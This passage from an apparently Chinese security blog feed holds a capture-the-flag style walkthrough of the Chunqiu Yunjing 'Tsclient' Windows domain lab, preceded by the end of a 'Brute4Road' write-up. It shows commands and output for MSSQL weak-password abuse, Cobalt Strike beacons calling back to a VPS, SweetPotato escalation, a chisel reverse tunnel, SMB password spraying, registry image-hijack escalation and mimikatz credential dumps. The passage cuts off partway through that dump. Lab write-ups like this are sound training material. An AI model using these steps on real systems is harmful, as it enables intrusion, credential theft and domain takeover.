operator">/</span>ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3ihTh72FZzfLiNQaagMhKJU3VW6tsrVSnAoIU9Ao8Ud9cWtXosE4w+3377D/93aQZmlH8ZBYJTBP6SNaANHakY3HAsfOv9I2h4iDG/uxTZiaKjo4FFGjDMxHCQxjTGdTL6Fxm4ahEAKeaDTpmQoGqZ5lx1X+ZXBx3umaPQsPycx+aFof6T3wYet6i6hFRL31gSENo06Lc6Z72gGTK1UBfonZd+VYhMxD5RbBofCVHguGur/<span class="token operator">+</span><span class="token operator">/</span>xFz4CDd/jd2ggit8QorS3QWeuGVaDQb8dxv1ky0ssrKmeGNlJa1oUS8sL2jjQdKVo2yNgJ3QHjPQRijdLDRE6sSeaGKMTwqmddUQjOFO8XeJjp+ET+udbXlj2ZctYD29PbkicFeOZUy5EM3hyfpF97+vbe+kREcqKPmA8rYwuW+nvT+tUVhpgmI9F2x1zySJNx46sZIHlK8K3Cn8/y2WJJeDpndYFaFmIzo/jrGF1Bd7OWhwvHTsXcUSGVcjwGa5Gy4qboEfoJiQvrgRNsn4yFccw7mVqUISr51kGuZv+VjXoEvIODbdc8J/WRQYle3CemDnO9biagEAzq2cguFPRs9+h+sE8mLiOGEg3BFtgVXCm4/rTo82AfBFNYOsJYK0FuDkKPTAlxvS5Ywu5Lxgso4+QoeKjyyfSx+A2r1Y/WJPj+5XzlCTICP5zRAvv1/WCzdgQbfYt4E5vA4+GndCJfuXb4CCTxAvgT8oNllym4KrrGNBD7mUa0PcJkBVJ1qGqVpgoWg3iUob5phn/VE+DbnwQTHA/BECEE6TCM2B5v8v77MhKKLkjglUK9zwXihG3z3QVQYLBknYy1ZvA71Xv2AW2O0KrZ6V3wDCeVuP34QOmBoes8eKBFfy3HMYIapGA8JXCDVIOmhOKd9ymUPeGjQAkWyD2wywAKgmUeDQ0TB6l+xqbB0Gnl71vjFqg+NenqeWv/zqD6pLbkEr1tvRm7jhwuN3M9ztZAf9fxvY6A3jpNHIxTzHny28pNTZglbBCwX6DlKyyC000puQJ+9y7/T0Ejwb8XZca925vOK+bfN+XA6+8NjW5kyACA3RGYIK5oBUIkQcOaZ6EsqWoSPNOI2lmmg6cUrddvRWTW/qcbeoD5hSLJaj8bxcW1jQyAkIfjAimnizRPx4w74oNMSHDxAee3AJfddR5xJtpnDvKZyFVnaoLPbZH5JrsRW5bvUuXbSn73v6hOK/fYaQ3yXCb/3v+KyjRlWlznxseKrUxHC9Tz9OouyMJLBI/u8+ngUVpm3CK3cVtR3jpGw9JOmCrDu1PfFYepkIvx658CP5XhGEOeJQr59wVoAXADId8VMtPMwsxDyl1OLxDzB/iuJ5BenyUBklO4Ina8oCsJJZJWLJCTzXOz9MZ3UPncjS8yyVkcpidc9T9LoXce7Lc1cyS56qmk3Uqttslds5UPcGT2sMDc/AzpZKonKj18ptQe0kyCwHp0zpcTVujgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBBIOkEIW+fONWh+YR1fJV4DoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDIyNDE4MjQwNFqmERgPMjAyNTAyMjUwNDI0MDRapxEYDzIwMjUwMzAzMTgyNDA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225022614267.png" alt="image-20250225022614267"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/image-20250225022640361.png" alt="image-20250225022640361"></p><p>于是拿到flag</p><p>flag04: <code>flag&#123;323be6d4-137b-4d8e-ad3e-f92f5ba469c6&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/09/03/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7brute4road/&quot;&gt;https://fushuling.com/index.php/2023/09/03/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7brute4road/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/08/chunqiuyunjing-brute4road-writeup/&quot;&gt;https://exp10it.io/2023/08/chunqiuyunjing-brute4road-writeup/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>春秋云境 Tsclient</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/</id>
    <published>2025-02-24T07:12:05.000Z</published>
    <updated>2025-02-24T18:00:36.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/">https://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/</a></p><p><a href="https://bowuchuling.github.io/posts/chunqiu_Tsclient">https://bowuchuling.github.io/posts/chunqiu_Tsclient</a></p><p><a href="https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/">https://exp10it.io/2023/07/chunqiuyunjing-tsclient-writeup/</a></p><span id="more"></span><hr><h1 id="MSSQL弱口令"><a href="#MSSQL弱口令" class="headerlink" title="MSSQL弱口令"></a>MSSQL弱口令</h1><p>打开靶机，是一个 IIS 服务</p><p>先拿 fscan 扫一下（我这里 fscan 用的2.0版本可能有些不一样的地方）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.112.51 <span class="token parameter variable">-p</span> <span class="token number">1</span>-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224152832123.png" alt="image-20250224152832123"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">15</span>:21:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.112.51       状态码:200 长度:703    标题:IIS Windows Server<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">15</span>:21:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">39.98</span>.112.51主机名: WIN-WEB发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.8.18   IPv6地址:      └─ <span class="token number">2001</span>:0:348b:fb58:10fe:3a80:d89d:8fcc<span class="token punctuation">[</span><span class="token number">2025</span>-02-24 <span class="token number">15</span>:21:52<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> MSSQL <span class="token number">39.98</span>.112.51:1433 sa 1qaz<span class="token operator">!</span>QAZ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接把mssql的账密扫出来了：<code>sa:1qaz!QAZ</code></p><p>MDUT 连一下：<a href="https://github.com/SafeGroceryStore/MDUT/">https://github.com/SafeGroceryStore/MDUT/</a></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224152725584.png" alt="image-20250224152725584"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224154538584.png" alt="image-20250224154538584"></p><p>激活 XpCmdshell 组件，然后执行命令</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224155404028.png" alt="image-20250224155404028"></p><hr><h1 id="CS上马"><a href="#CS上马" class="headerlink" title="CS上马"></a>CS上马</h1><p>参考：<a href="https://www.freebuf.com/articles/network/403618.html">https://www.freebuf.com/articles/network/403618.html</a></p><p>先把整个 cobaltstrike 压缩包传到 vps 上，解压启动 teamsever 作为服务端</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224163138511.png" alt="image-20250224163138511"></p><p>然后启动本地的客户端</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224163315333.png" alt="image-20250224163315333"></p><p>连接后启动监听器</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224163659468.png" alt="image-20250224163659468"></p><p>http hosts 填写自己的 vps ip，http host stager 也选择自己的 vps ip，端口为之后反弹shell需要监听的端口</p><p>然后生成 exe，注意是 x64 的</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224163720022.png" alt="image-20250224163720022"></p><p>然后上传到可写目录并执行，C:&#x2F;Users&#x2F;Public 就是可写的</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224164509246.png" alt="image-20250224164509246"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224164538494.png" alt="image-20250224164538494"></p><p>这样就上线了</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224164629080.png" alt="image-20250224164629080"></p><p>这里修改一下回连时间，默认是60秒太久了，右键会话进入 interact</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224165523057.png" alt="image-20250224165523057"></p><h1 id="SweetPotato提权"><a href="#SweetPotato提权" class="headerlink" title="SweetPotato提权"></a>SweetPotato提权</h1><p>前面 mssqlserver 是低权限，需要提权，考虑 SweetPotato 提权：<a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p><p>这里要选仓库里那个 new 的才能打，上传 SweetPotato.exe</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">C:<span class="token operator">/</span>Users/Public/temp/SweetPotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>a whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224165635815.png" alt="image-20250224165635815"></p><p>提权至 system</p><p>于是读 flag</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">C:<span class="token operator">/</span>Users/Public/temp/SweetPotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>a <span class="token string">"type C:\Users\Administrator\flag\flag01.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224165759171.png" alt="image-20250224165759171"></p><p>flag01: <code>flag&#123;c1791650-b5b2-4cd2-9d4c-00b22a5fd77e&#125;</code></p><p>接下来用 system 权限触发 beacon，这样 CS 就可以上线 system 权限的马了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:/Users/Public/temp/SweetPotato.exe <span class="token parameter variable">-a</span> <span class="token string">"C:/Users/Public/temp/beacon.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224170024774.png" alt="image-20250224170024774"></p><hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="内网信息"><a href="#内网信息" class="headerlink" title="内网信息"></a>内网信息</h2><p>传 fscan 扫一下</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224172504037.png" alt="image-20250224172504037"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell ipconfigshell C:\Users\Public\temp\fscan<span class="token punctuation">.</span>exe <span class="token operator">-</span>h 172<span class="token punctuation">.</span>22<span class="token punctuation">.</span>8<span class="token punctuation">.</span>18/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.22</span>.8.18     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.22</span>.8.15     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.22</span>.8.31     is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.22</span>.8.46     is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">4</span><span class="token number">172.22</span>.8.31:445 <span class="token function">open</span><span class="token number">172.22</span>.8.46:445 <span class="token function">open</span><span class="token number">172.22</span>.8.15:445 <span class="token function">open</span><span class="token number">172.22</span>.8.18:1433 <span class="token function">open</span><span class="token number">172.22</span>.8.18:445 <span class="token function">open</span><span class="token number">172.22</span>.8.46:139 <span class="token function">open</span><span class="token number">172.22</span>.8.31:139 <span class="token function">open</span><span class="token number">172.22</span>.8.15:139 <span class="token function">open</span><span class="token number">172.22</span>.8.46:135 <span class="token function">open</span><span class="token number">172.22</span>.8.31:135 <span class="token function">open</span><span class="token number">172.22</span>.8.18:139 <span class="token function">open</span><span class="token number">172.22</span>.8.15:135 <span class="token function">open</span><span class="token number">172.22</span>.8.18:135 <span class="token function">open</span><span class="token number">172.22</span>.8.46:80 <span class="token function">open</span><span class="token number">172.22</span>.8.18:80 <span class="token function">open</span><span class="token number">172.22</span>.8.15:88 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">16</span>start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.8.18   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-WEB   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.8.18   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">2001</span>:0:348b:fb58:10fe:3a80:d89d:8fcc<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.8.31     XIAORANG<span class="token punctuation">\</span>WIN19-CLIENT         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.8.46   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN2016   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.8.46<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.8.15     <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:XIAORANG<span class="token punctuation">\</span>DC01           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.8.31   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN19-CLIENT   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.8.31<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">172.22</span>.8.15   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>DC01   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">172.22</span>.8.15<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.8.46     WIN2016.xiaorang.lab                Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mssql <span class="token number">172.22</span>.8.18:1433:sa 1qaz<span class="token operator">!</span>QAZ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>搜集一下用户信息</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224170215662.png" alt="image-20250224170215662"></p><p>因为我们是最高权限，直接 dump hash</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224170252457.png" alt="image-20250224170252457"></p><p>查看在线用户</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell quser <span class="token punctuation">|</span><span class="token punctuation">|</span> qwinst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224170342613.png" alt="image-20250224170342613"></p><p>可以看到这个用户是在线的，因此我们可以用 CS 直接注入进程上线</p><hr><h1 id="CS注入在线用户进程上线"><a href="#CS注入在线用户进程上线" class="headerlink" title="CS注入在线用户进程上线"></a>CS注入在线用户进程上线</h1><p>右键会话查看进程，找到 john 的进程</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224171531588.png" alt="image-20250224171531588"></p><p>inject 注入进程，然后就能上线 john 账户</p><p>查看共享文件</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell net use<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224171816528.png" alt="image-20250224171816528"></p><p>看一下目录</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224171947781.png" alt="image-20250224171947781"></p><p>\\tsclient\c\credential.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#Do you know how to hijack Image?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>给了个账密，提示映像劫持</p><hr><h1 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h1><p>老规矩 chisel 代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell C:\Users\Public\temp\chisel<span class="token punctuation">.</span>exe client vpsip:33322 R:0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="smb密码喷洒"><a href="#smb密码喷洒" class="headerlink" title="smb密码喷洒"></a>smb密码喷洒</h1><p>kali 上试一下密码喷洒，看看哪台机器能登录上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> crackmapexec smb <span class="token number">172.22</span>.8.0/24 <span class="token parameter variable">-u</span> <span class="token string">'Aldrich'</span> <span class="token parameter variable">-p</span> <span class="token string">'Ald@rLMWuy7Z!#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224173801747.png" alt="image-20250224173801747"></p><p>后面三个提示密码过期，需要修改密码，使用这个工具：<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 changepasswd.py xiaorang.lab/Aldrich:<span class="token string">'Ald@rLMWuy7Z!#'</span>@172.22.8.15 <span class="token parameter variable">-newpass</span> <span class="token string">'Whoami@666'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224175131623.png" alt="image-20250224175131623"></p><h1 id="RDP连接"><a href="#RDP连接" class="headerlink" title="RDP连接"></a>RDP连接</h1><p>配置 proxifier 给 rdp 连接，测试发现只能登上 172.22.8.46 的 rdp</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224180520483.png" alt="image-20250224180520483"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224180008369.png" alt="image-20250224180008369"></p><h1 id="不出网上线CS"><a href="#不出网上线CS" class="headerlink" title="不出网上线CS"></a>不出网上线CS</h1><p>连上后发现不出网</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224180436664.png" alt="image-20250224180436664"></p><p>用 172.22.8.18 转发上线的CS，选这个 listerner 生成马</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224181346056.png" alt="image-20250224181346056"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224181410889.png" alt="image-20250224181410889"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224181525214.png" alt="image-20250224181525214"></p><p>远程桌面我们可以直接把本机的文件复制粘贴过去，所以生成完复制过去然后点一下即可上线</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224181714877.png" alt="image-20250224181714877"></p><hr><h1 id="映像劫持提权"><a href="#映像劫持提权" class="headerlink" title="映像劫持提权"></a>映像劫持提权</h1><p>参考：<a href="https://blog.csdn.net/weixin_44268918/article/details/132338391">https://blog.csdn.net/weixin_44268918/article/details/132338391</a></p><p>先查看权限</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">get-acl</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"</span> <span class="token punctuation">|</span> <span class="token function">fl</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224214006132.png" alt="image-20250224214006132"></p><p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，使用放大镜进行提权（因为放大镜可以在用户锁定的情况下启动，是 system 权限）</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">REG ADD <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"</span> <span class="token operator">/</span>v Debugger <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>d <span class="token string">"C:\windows\system32\cmd.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224214607188.png" alt="image-20250224214607188"></p><p>然后锁定用户，在登录界面右下角轻松访问处使用放大镜，可以以 system 权限调用 cmd</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224214811688.png" alt="image-20250224214811688"></p><p>那么先上线cs</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224214958749.png" alt="image-20250224214958749"></p><p>在 Administrator 找到 flag2</p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224215239879.png" alt="image-20250224215239879"></p><p><img src="/blog/2025/02/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/image-20250224215427723.png" alt="image-20250224215427723"></p><p>flag02: <code>flag&#123;d604441f-aec1-433d-8de6-5a4affd9e293&#125;</code></p><hr><h1 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h1><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">logonpasswordsshell net user <span class="token operator">/</span>domainshell net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> logonpasswords<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 296058 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:Authentication Id : 0 <span class="token punctuation">;</span> 23322653 <span class="token punctuation">(</span>00000000:0163e01d<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 2User Name         : DWM-2Domain            : Window ManagerLogon Server      : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>Logon Time        : 2025/2/24 18:00:20SID               : S-1-5-90-0-2msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> NTLM     : 62c2c5b11bdf4e29ff9f7df1eac74fad <span class="token operator">*</span> SHA1     : 86e6967523f223115510b4ce053a8eaf5de502f5tspkg :wdigest : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : XIAORANG <span class="token operator">*</span> Password : <span class="token punctuation">(</span>null<span class="token punctuation">)</span>kerberos : <span class="token operator">*</span> Username : WIN2016$ <span class="token operator">*</span> Domain   : xiaorang<span class="token punctuation">.</span>lab <span class="token operator">*</span> Password : d5 f9 34 f3 81 31 6e ff e2 a4 1b 56 55 57 de 7c 99 af 71 a8 4f 26 06 d3 5f 2e ad 91 25 77 07 59 7a 6e 5a a3 b6 40 c7 cb 29 45 15 a7 3e 1e 7c d2 70 53 a9 db 4d 9b 0e 7b ed 94 84 f1 27 a5 37 f1 b7 a9 2d 8f 13 58 af f2 dd 83 9c 9e 5e 7e cd 3d 3e 5b 79 4a a3 9d 28 50 71 9b 3d 54 df f8 8e f6 eb d7 90 ad 52 fd d2 19 1a 8a 57 00 cc 75 32 76 84 16 a7 95 <span class="token function">fc</span> ad 2f f1 73 6b b8 3d a2 17 bb 0a 38 e0 26 26 b9 41 02 30 00 43 ab 62 00 48 44 <span class="token function">fc</span> 6d a2 e5 55 de e8 db ae 85 fa 11 af 63 92 52 ae db 3b ff d7 56 53 03 d1 37 16 5b bc 45 c0 cf 89 90 df 56 e3 b2 c5 ae 8f 56 32 76 77 71 ec 01 34 e7 49 eb 14 63 ff 5d 03 83 10 00 b8 ec 7b 71 a8 c9 d0 52 4a ab f3 aa 1f 00 7f a8 d9 ff ef 3e 